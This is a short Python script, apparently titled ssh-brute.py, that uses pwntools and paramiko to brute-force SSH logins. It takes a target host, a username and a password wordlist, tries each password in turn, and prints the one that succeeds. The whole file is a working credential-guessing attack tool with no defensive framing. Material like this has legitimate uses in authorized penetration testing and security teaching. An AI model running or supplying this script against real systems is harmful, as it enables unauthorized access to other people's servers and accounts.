import sys
import paramiko
from pwn import *

if len(sys.argv) !=4:
	print("Invalid arguments!")
	print(">> {} <ssh-brute.py> <target> <username> <wordlist>".format(sys.argv[0]))
	exit()
#target host
host = sys.argv[1]
#ssh username
username = sys.argv[2]
#wordlist
wordlist = sys.argv[3]
#connection attempt count
attempts = 0
#open the password list and read file
with open(wordlist, "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            print("No valid password found")
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("Nothing found")
        attempts += 1
